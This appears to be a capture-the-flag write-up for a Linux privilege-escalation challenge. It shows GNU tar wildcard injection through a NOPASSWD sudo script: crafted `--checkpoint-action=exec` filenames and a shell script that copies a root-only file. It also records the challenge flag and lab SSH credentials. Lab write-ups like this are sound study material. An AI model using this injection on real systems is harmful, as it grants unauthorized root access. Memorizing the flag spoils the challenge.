# Afterparty Crew (misc / linux-tar)

Desk: http://54.72.82.22:8550/ — SSH `player@54.72.82.22:8710` pw `matinee-visitor`.

## Box shape
- `/app/service.py` runs as root (kind `linux-tar`) but its routes only expose the web
  `/submit` answer-hash check + a `/api/...` dispatch that contains no exploitable
  branch for this kind. The real access is SSH.
- Installer `/app/linux/install.sh` grants:
  `player ALL=(root) NOPASSWD: /usr/local/bin/pack-stage`
- `/usr/local/bin/pack-stage` (root):
  ```sh
  cd /home/player/sets
  /usr/bin/tar -cf /tmp/night.tar *
  ```
- `start.sh` writes the flag to `/root/receipt` (mode 400, root-only). `ls -ld /root` = 700.
  So the goal is just root file read.

## Vector: GNU tar wildcard injection
`/home/player/sets` is player-writable and the `*` glob is expanded by root's shell,
so filenames beginning with `-` are parsed by GNU tar (1.35) as options.
Create in `sets/`:
- `--checkpoint=1`               (enable a checkpoint on every record)
- `--checkpoint-action=exec=sh p.sh`  (run a command at the checkpoint)
- `p.sh` containing `cp /root/receipt /tmp/r.txt; chmod 644 /tmp/r.txt`
- `keep.txt` (a normal member so tar has something to write)

Then `sudo -n /usr/local/bin/pack-stage` runs tar as root, fires the checkpoint, and
`p.sh` executes as root. Read `/tmp/r.txt`.

Note: the action command cannot contain `/` (a filename with `/` is treated as a path),
so the payload lives in `p.sh` referenced relatively from tar's cwd.

## Flag
`safctf{66bda7b8ede495eb131f6bf5bbb9d889}`  (read from /root/receipt)

## Sibling hint (Workshop Nocturne, HMAC manifest worker) — not this box
No inbox-polling root worker or HMAC/`manifest.json` gate exists here; `inbox/` is empty
and `ps auxww` shows only `/app/service.py` + sshd. This box's intended path is the
NOPASSWD `pack-stage` tar wildcard above.

## Artifacts
None downloaded; nothing to hash.
